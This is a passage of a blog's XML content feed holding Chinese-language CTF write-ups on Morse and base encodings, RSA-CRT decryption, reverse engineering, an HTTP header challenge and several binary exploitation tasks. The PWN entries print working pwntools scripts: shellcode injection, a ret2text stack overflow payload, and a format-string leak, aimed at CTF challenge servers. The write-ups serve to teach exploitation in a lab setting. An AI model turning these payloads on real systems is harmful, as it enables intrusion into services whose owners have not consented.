website</a>.</p><hr><p>Let me know if you’d like help with a specific task using DeepSeek-R1 or another model! 😊</p>]]></content>
      
      
      <categories>
          
          <category> Deepseek </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>摩斯电码</title>
      <link href="/2025/06/828dca5ddec2.html"/>
      <url>/2025/06/828dca5ddec2.html</url>
      
        <content type="html"><![CDATA[<p>…. . .-.. .-.. — ..–.- -.-. .-. -.– .–. - —<br>hello_crypto<br>TZCFlag{HELLO_CRYPTO}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 常见编码 </category>
          
          <category> 莫尔斯电码(Morse Code) </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>摩丝</title>
      <link href="/2025/06/21db97fd724d.html"/>
      <url>/2025/06/21db97fd724d.html</url>
      
        <content type="html"><![CDATA[<p>.. .-.. — …- . -.– — ..-<br>iloveyou</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 常见编码 </category>
          
          <category> 莫尔斯电码(Morse Code) </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/06/358bdb20a0d3.html"/>
      <url>/2025/06/358bdb20a0d3.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 不知道分哪类 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>password</title>
      <link href="/2025/06/fbf475443deb.html"/>
      <url>/2025/06/fbf475443deb.html</url>
      
        <content type="html"><![CDATA[<p>姓名：张三<br>生日：19900315<br>key格式为key{xxxxxxxxxx}</p><p>发现如果将张三变为 zs加上它的日期长度刚好符合题目的xx长度，那我们不妨试下：<br>flag{zs19900315}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 不知道分哪类 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>dancemen</title>
      <link href="/2025/06/cbb71a3305da.html"/>
      <url>/2025/06/cbb71a3305da.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/dancemen.jpg"><br><img src="/images/Pastedimage20250603124314.png"><br>TZCFlag{dancemenareinteresting}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 不知道分哪类 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Rabbit 1</title>
      <link href="/2025/06/bf8f92268b07.html"/>
      <url>/2025/06/bf8f92268b07.html</url>
      
        <content type="html"><![CDATA[<p>U2FsdGVkX1&#x2F;+ydnDPowGbjjJXhZxm2MP2AgI<br><img src="/images/8C5ED5D3-48AE-4A5B-94BF-527E062586AC.png"><br><a href="https://www.sojson.com/encrypt_rabbit.html">https://www.sojson.com/encrypt_rabbit.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> Rabbit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>shellcode</title>
      <link href="/2025/06/63e0052f564e.html"/>
      <url>/2025/06/63e0052f564e.html</url>
      
        <content type="html"><![CDATA[<p><img src="/./../../images/D963E729-82E8-4920-BCC6-3E43CDB31255.png"><br>检查安全机制发现 <strong>NX (No-Execute) 已启用</strong>，这意味着栈内存不可执行，因此无法直接执行栈上的 shellcode。但题目中有一个明显的 <strong>后门函数</strong>，这应该才是解题的关键。<br><img src="/./../../images/Pastedimage20250605220423.png"><br><img src="/./../../images/Pastedimage20250605220507.png"><br>也没有开啥保护。<br>logo明显提示用shellcode,所以我们需要发送sellcode。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">&quot;./pwn3&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;10.190.131.17&quot;</span>,<span class="number">62534</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">payload=shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/./../../images/17DD8EEB-247B-4BB2-8BA3-995677E381841.png"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>整数溢出</title>
      <link href="/2025/06/1f04604b780a.html"/>
      <url>/2025/06/1f04604b780a.html</url>
      
        <content type="html"><![CDATA[<p><img src="/./../../images/82DBD94C-4B71-4F33-8BD4-3EECD2675F78.png"><br><img src="/./../../images/Pastedimage20250605212046.png"><br><img src="/./../../images/Pastedimage20250605212223.png"><br>这里的<strong>0 ~ 0x7fffffff</strong>就是 <strong>0~2147483647</strong> ，<br><strong>0x80000000 ~ 0xffffffff</strong>就是 <strong>-2147483648 ~ -1</strong><br><img src="/./../../images/Pastedimage20250605212238.png"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置环境</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接服务器（根据题目提示修改端口）</span></span><br><span class="line">p = remote(<span class="string">&#x27;10.190.131.17&#x27;</span>, <span class="number">61862</span>)  <span class="comment"># 示例端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待提示</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Enter an unsigned integer: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送目标数字</span></span><br><span class="line">p.sendline(<span class="string">b&quot;4294967295&quot;</span>)  <span class="comment"># 或 b&quot;-1&quot; 在某些环境下也可</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收flag</span></span><br><span class="line"><span class="built_in">print</span>(p.recvall().decode())</span><br></pre></td></tr></table></figure><p>这道题涉及整数溢出漏洞利用，目标是通过输入特定数字触发<code>gift()</code>函数获取flag。以下是完整的解题步骤：</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><ol><li><strong>关键代码</strong>：<br> printf(“Enter an unsigned integer: “);<br> _isoc99_scanf(“%u”, &amp;v4);  &#x2F;&#x2F; 读取无符号整数<br> if (v4 &#x3D;&#x3D; -1)  &#x2F;&#x2F; -1在无符号中等于4294967295<br> gift();    &#x2F;&#x2F; 触发flag输出</li><li><strong>整数溢出原理</strong>：<ul><li><code>v4</code>是<code>unsigned int</code>类型（4字节）</li><li><code>-1</code>在内存中被解释为无符号整数的最大值：<code>0xFFFFFFFF</code>（4294967295）    </li><li>输入<code>4294967295</code>可使条件<code>v4 == -1</code>成立</li></ul></li><li><strong>防护机制</strong>：<br> Full RELRO | Canary | NX | PIE<br> 虽然防护较强，但无需绕过这些保护，因为利用不涉及栈溢出</li></ol><h3 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h3><ol><li><strong>计算目标值</strong>：<br> 4294967295 &#x3D; 2³² - 1 &#x3D; 0xFFFFFFFF</li><li><strong>触发gift函数</strong>：<ul><li>当输入<code>4294967295</code>时：<br>  v4 &#x3D; 4294967295 &#x3D; 0xFFFFFFFF<br>  v4 &#x3D;&#x3D; -1 → True  &#x2F;&#x2F; 因为-1在无符号中就是0xFFFFFFFF</li><li>执行<code>system(&quot;cat /ctfshow_flag&quot;)</code><br> <img src="/images/91C4D1E4-DA5C-45B1-A1AE-72BD35872AC2.png"></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ret2text</title>
      <link href="/2025/06/6eb5ab8aa336.html"/>
      <url>/2025/06/6eb5ab8aa336.html</url>
      
        <content type="html"><![CDATA[<p><img src="/./../../images/53C70E9A-8E89-4C8B-95E3-7078BD55343B1.png"><br>32位<br><img src="/./../../images/Pastedimage20250605135457.png"><br>Tab键<br><img src="/./../../images/Pastedimage20250605135812.png"><br>nc一下<br><img src="/./../../images/EAFBEA4F-0F51-421C-AD17-A89910A6224D.png"><br>看pwnme函数<br><img src="/./../../images/Pastedimage20250605140015.png"><br>这里有个fgets函数<br>Tab键<br><img src="/./../../images/Pastedimage20250605140201.png"><br><strong>可以看到第一行s这个变量是在距离栈底ebp9个字节的地方</strong><br><img src="/./../../images/463C8EE2-1263-43AF-B876-7B0C4F4B928F.png"><br>题目叫stack，所以看了一下stack函数<br><img src="/./../../images/Pastedimage20250605140449.png"><br>妥妥的getshell函数<br>这段代码 system(“&#x2F;bin&#x2F;sh”) 的作用是在 Linux 系统中执行 &#x2F;bin&#x2F;sh 命令，它会打开一个新的 shell 进程。<br>具体来说，&#x2F;bin&#x2F;sh 是指向系统中的默认 shell 解释器的路径。通过执行该命令，你将进入一个新的交互式 shell 环境，可以在其中执行各种命令和操作。这对于开发者或者在某些情况下需要与系统进行交互的用户来说非常有用。</p><p>main点一下绿色<br><img src="/./../../images/Pastedimage20250605141027.png"><br>可以看到该函数地址为0x0804850F<br><img src="/./../../images/3BBE1FF3-C061-4222-B03E-C2B1AB35901F.png"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28308</span>)    <span class="comment">#远程连接</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">9</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x0804850F</span>)   <span class="comment">#用a字符填满前面9个字节的空白，然后再用4字节填满原来的ebp(这里为汇编基础，因为程序位32位程序）</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)                    <span class="comment">#然后p32将stack函数写入地址的四个字节</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/./../../images/3D19A85A-20C8-444E-A235-C906BCB99447.png"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p =remote(<span class="string">&quot;pwn.chall.ctf.show&quot;</span>,<span class="number">28006</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x9</span>+<span class="number">4</span>) + p32(<span class="number">0x0804850F</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ChattyParrot&#x27;</span>)</span><br><span class="line">secret_addr = <span class="number">0x4040a0</span></span><br><span class="line">offset = <span class="number">41</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug_exploit</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;带调试信息的漏洞利用&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 启动程序并设置环境变量</span></span><br><span class="line">        p = process(<span class="string">&#x27;./ChattyParrot&#x27;</span>, env=&#123;<span class="string">&#x27;FLAG_VAL&#x27;</span>: <span class="string">&#x27;debug_flag&#x27;</span>&#125;)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 打印程序启动信息</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 程序启动，pid: <span class="subst">&#123;p.pid&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 接收输入提示</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            prompt = p.recvuntil(<span class="string">b&#x27;Input your phrase:&#x27;</span>, timeout=<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] 接收到提示: <span class="subst">&#123;prompt.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] 未接收到输入提示，程序可能提前退出&quot;</span>)</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 构造并打印payload</span></span><br><span class="line">        payload = p64(secret_addr) + <span class="string">f&#x27;%<span class="subst">&#123;offset&#125;</span>$s&#x27;</span>.encode()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] payload: <span class="subst">&#123;payload.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] payload长度: <span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span> 字节&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 发送payload</span></span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] 已发送payload&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 接收响应</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = p.recv(<span class="number">1024</span>, timeout=<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] 接收到响应: <span class="subst">&#123;response.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;grodno&#123;&#x27;</span> <span class="keyword">in</span> response:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] 成功获取FLAG: <span class="subst">&#123;response.decode(<span class="string">&#x27;utf-8&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[*] 尝试交互式模式&quot;</span>)</span><br><span class="line">                p.interactive()</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] 接收响应出错: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        p.close()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] 漏洞利用出错: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;p&#x27;</span> <span class="keyword">in</span> <span class="built_in">locals</span>():</span><br><span class="line">            p.close()</span><br><span class="line"></span><br><span class="line">debug_exploit()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_payload_without_wait</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;ctf.mf.grsu.by&#x27;</span>, <span class="number">9077</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 不等待提示，直接发送payload</span></span><br><span class="line">        payload = <span class="string">b&#x27;%41$s&#x27;</span></span><br><span class="line">        p.sendline(payload)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 接收所有可能的数据</span></span><br><span class="line">        response = p.recvall(timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 响应: <span class="subst">&#123;response.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 文本形式: <span class="subst">&#123;response.decode(errors=<span class="string">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] 错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">send_payload_without_wait()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">grodno&#123;J35KiI_P4RR07_Drug_M47u3&#125;</span><br></pre></td></tr></table></figure><p>爆破密码zip </p><p> <code>super-secret-file.txt</code></p><p>grodno{0n_linux_it_would_be_easier_t0_do_this}</p><p>86.57.166.23</p><p>grodno{2002:5639:A617::&#x2F;48}</p><p>grodno{4374575035158325358345436}</p><h2 id="Binwalk"><a href="#Binwalk" class="headerlink" title="Binwalk"></a>Binwalk</h2><h6 id="DECIMAL-HEXADECIMAL-DESCRIPTION"><a href="#DECIMAL-HEXADECIMAL-DESCRIPTION" class="headerlink" title="DECIMAL       HEXADECIMAL     DESCRIPTION"></a>DECIMAL       HEXADECIMAL     DESCRIPTION</h6><p>0             0x0             PNG image, 740 x 740, 8-bit&#x2F;color RGBA, non-interlaced<br>287           0x11F           Zlib compressed data, compressed</p><p>dd if&#x3D;Yin_Yang.png of&#x3D;extracted_zlib skip&#x3D;287 bs&#x3D;1 </p><p>342959+0 records in </p><p>342959+0 records out </p><p>342959 bytes (343 kB, 335 KiB) copied, 0.872282 s, 393 kB&#x2F;s</p><p>grodno{Hacker;1&#x2F;1999}</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from docx import Document</span><br><span class="line"></span><br><span class="line">visually_similar_letters = &#123;</span><br><span class="line">    &#x27;A&#x27;: (&#x27;А&#x27;, &#x27;A&#x27;), &#x27;a&#x27;: (&#x27;а&#x27;, &#x27;a&#x27;),</span><br><span class="line">    &#x27;B&#x27;: (&#x27;В&#x27;, &#x27;B&#x27;),</span><br><span class="line">    &#x27;C&#x27;: (&#x27;С&#x27;, &#x27;C&#x27;), &#x27;c&#x27;: (&#x27;с&#x27;, &#x27;c&#x27;),</span><br><span class="line">    &#x27;E&#x27;: (&#x27;Е&#x27;, &#x27;E&#x27;), &#x27;e&#x27;: (&#x27;е&#x27;, &#x27;e&#x27;),</span><br><span class="line">    &#x27;H&#x27;: (&#x27;Н&#x27;, &#x27;H&#x27;),</span><br><span class="line">    &#x27;K&#x27;: (&#x27;К&#x27;, &#x27;K&#x27;),</span><br><span class="line">    &#x27;M&#x27;: (&#x27;М&#x27;, &#x27;M&#x27;),</span><br><span class="line">    &#x27;O&#x27;: (&#x27;О&#x27;, &#x27;O&#x27;), &#x27;o&#x27;: (&#x27;о&#x27;, &#x27;o&#x27;),</span><br><span class="line">    &#x27;P&#x27;: (&#x27;Р&#x27;, &#x27;P&#x27;), &#x27;p&#x27;: (&#x27;р&#x27;, &#x27;p&#x27;),</span><br><span class="line">    &#x27;T&#x27;: (&#x27;Т&#x27;, &#x27;T&#x27;),</span><br><span class="line">    &#x27;X&#x27;: (&#x27;Х&#x27;, &#x27;X&#x27;), &#x27;x&#x27;: (&#x27;х&#x27;, &#x27;x&#x27;),</span><br><span class="line">    &#x27;Y&#x27;: (&#x27;У&#x27;, &#x27;Y&#x27;), &#x27;y&#x27;: (&#x27;у&#x27;, &#x27;y&#x27;),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># Создаём обратную мапу: символ -&gt; (латиница/кириллица)</span><br><span class="line"></span><br><span class="line">char_origin = &#123;&#125;</span><br><span class="line">for pair in visually_similar_letters.values():</span><br><span class="line">    cyrillic, latin = pair</span><br><span class="line">    char_origin[cyrillic] = &#x27;0&#x27;  # 0 — кириллица</span><br><span class="line">    char_origin[latin] = &#x27;1&#x27;     # 1 — латиница</span><br><span class="line"></span><br><span class="line">def extract_bits_from_docx(path):</span><br><span class="line">    doc = Document(path)</span><br><span class="line">    bits = []</span><br><span class="line"></span><br><span class="line">    for para in doc.paragraphs:</span><br><span class="line">        for ch in para.text:</span><br><span class="line">            if ch in char_origin:</span><br><span class="line">                bits.append(char_origin[ch])</span><br><span class="line">    </span><br><span class="line">    return &#x27;&#x27;.join(bits)</span><br><span class="line"></span><br><span class="line"># Пример использования:</span><br><span class="line"></span><br><span class="line">binary_message = extract_bits_from_docx(&#x27;history.docx&#x27;)</span><br><span class="line">print(&quot;Извлечённые биты:&quot;, binary_message)</span><br><span class="line"></span><br><span class="line">def bits_to_text(bits):</span><br><span class="line">    chars = []</span><br><span class="line">    for i in range(0, len(bits), 8):</span><br><span class="line">        byte = bits[i:i+8]</span><br><span class="line">        if len(byte) == 8:</span><br><span class="line">            chars.append(chr(int(byte, 2)))</span><br><span class="line">    return &#x27;&#x27;.join(chars)</span><br><span class="line"></span><br><span class="line">hidden_text = bits_to_text(binary_message)</span><br><span class="line">print(&quot;Скрытое сообщение:&quot;, hidden_text)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ELF</title>
      <link href="/2025/06/232c7fc0fbd9.html"/>
      <url>/2025/06/232c7fc0fbd9.html</url>
      
        <content type="html"><![CDATA[<p>linux也能逆？</p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>tea</title>
      <link href="/2025/06/e1972a9f50a5.html"/>
      <url>/2025/06/e1972a9f50a5.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250606185429.png"><br><img src="/images/Pastedimage20250606185436.png"><br><img src="/images/Pastedimage20250606185452.png"></p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>简单的加密</title>
      <link href="/2025/06/596e40547bb0.html"/>
      <url>/2025/06/596e40547bb0.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250604161939.png"><br>shift+F12+Fn<br><img src="/images/Pastedimage20250604162108.png"><br>点击<br><img src="/images/Pastedimage20250604162142.png"><br>点击紫色的<br><img src="/images/Pastedimage20250604162209.png"><br>Tab键<br><img src="/images/25FB6DF9-3CCD-4E0E-8CCD-6A7C5D792114.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main_0(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  size_t i; // [esp+D0h] [ebp-114h]  </span><br><span class="line">  char Str1[260]; // [esp+DCh] [ebp-108h] BYREF</span><br><span class="line">  </span><br><span class="line">  #提示用户输入 flag</span><br><span class="line">  sub_456502(&quot;Hi CTFer,Input your flag:&quot;);</span><br><span class="line">  sub_4554EF(&quot;%s&quot;, Str1);</span><br><span class="line">  </span><br><span class="line">  for ( i = 0; i &lt; j__strlen(Str1); ++i )</span><br><span class="line">    ++Str1[i]; #将每个字符的 ASCII 值加 1</span><br><span class="line">  if ( !j__strcmp(Str1, &quot;gmbh|ZPV`GJOE`JU`IBIB~&quot;) )</span><br><span class="line">    sub_456502(&quot;you are right!\n&quot;);</span><br><span class="line">  else</span><br><span class="line">    sub_456502(&quot;you are wrong!\n&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对目标字符串 gmbh{ZPV<code>GJOE</code>JU<code>IBIB~&#125; 进行反向操作（每个字符减 1），得到原始输入的 flag：  每个字符减 1 后：</code>flag{YOU_FIND_IT_HAHA}&#96;</p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ez_http</title>
      <link href="/2025/06/5a69eaa25605.html"/>
      <url>/2025/06/5a69eaa25605.html</url>
      
        <content type="html"><![CDATA[<p>bp抓包<br><img src="/images/3AD6ED26-D5D6-4348-AF13-B5279A3A9036.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET：?FantasyLand=0xLE4KCODE</span><br><span class="line">POST：lyc0ris=goat</span><br><span class="line"></span><br><span class="line">请求头：</span><br><span class="line">Referer: https://www.tzc.edu.cn/</span><br><span class="line">User-Agent: SansBrowser</span><br><span class="line">Cookie: user=admin</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure><p>用hackbar也行</p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>大杂烩</title>
      <link href="/2025/06/228350e34cac.html"/>
      <url>/2025/06/228350e34cac.html</url>
      
        <content type="html"><![CDATA[<p>SkpERzY0Q0ZKRlpGVTJLU0dWVUVLVFNMT1JVRkFNM1lJVkhFVzNDWUpaWVRPNkE9</p><p>base64<br>JJDG64CFJFZFU2KSGVUEKTSLORUFAM3YIVHEW3CYJZYTO6A&#x3D;<br>base32<br>JFopEIrZiR5hENKthP3xENKlXNq7x<br>xxencode<br>GMPSynt{Penml_Pelcgb}<br>Rot13<br><img src="/images/ECF67C34-79AB-4AA8-A6AF-D1D146E8F829.png"><br>TZCFlag{Crazy_Crypto}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 常见编码 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RSA1</title>
      <link href="/2025/06/0208f5194904.html"/>
      <url>/2025/06/0208f5194904.html</url>
      
        <content type="html"><![CDATA[<p>p &#x3D; 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229<br>q &#x3D; 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469<br>dp &#x3D; 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929<br>dq &#x3D; 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041<br>c &#x3D; 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</p><p>&#x3D;&#x3D;dp,dq  是<code>d</code>模<code>p-1</code>和<code>q-1</code>的模逆元（在RSA中，它们通常用于快速解密，因为使用它们可以避免计算<code>d</code>，这是一个大数。&#x3D;&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import long_to_bytes   #将长整数转化为字节字符串</span><br><span class="line"> </span><br><span class="line">p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span><br><span class="line">q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span><br><span class="line">dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span><br><span class="line">dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span><br><span class="line">c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span><br><span class="line"> </span><br><span class="line">I = gmpy2.invert(q, p) </span><br><span class="line"> # 计算了q模p的模逆元。在数学上，这意味着I是一个整数，使得q * I mod p = 1。注意，这里的I并不是中国剩余定理中常用的h（h是p模q的模逆元），但在这个上下文中，我们只需要I</span><br><span class="line"> </span><br><span class="line">mp = pow(c, dp, p)   #使用模幂运算，计算c的dp次方模p的结果。</span><br><span class="line">mq = pow(c, dq, q)   #使用模幂运算，计算c的dq次方模q的结果。</span><br><span class="line"> </span><br><span class="line">m = (((mp-mq) * I) % p) * q + mq      #CRT的一个变种，用于从mp和mq中恢复明文m</span><br><span class="line"> </span><br><span class="line">print(long_to_bytes(m))    #解密后的整数m转换为字节字符串并输出 </span><br></pre></td></tr></table></figure><p> b’noxCTF{W31c0m3_70_Ch1n470wn}’→flag{W31c0m3_70_Ch1n470wn}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 非对称加密（Asymmetric Cryptography） </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>r4</title>
      <link href="/2025/06/e37fae821c0c.html"/>
      <url>/2025/06/e37fae821c0c.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 非对称加密（Asymmetric Cryptography） </category>
          
      </categories>
      
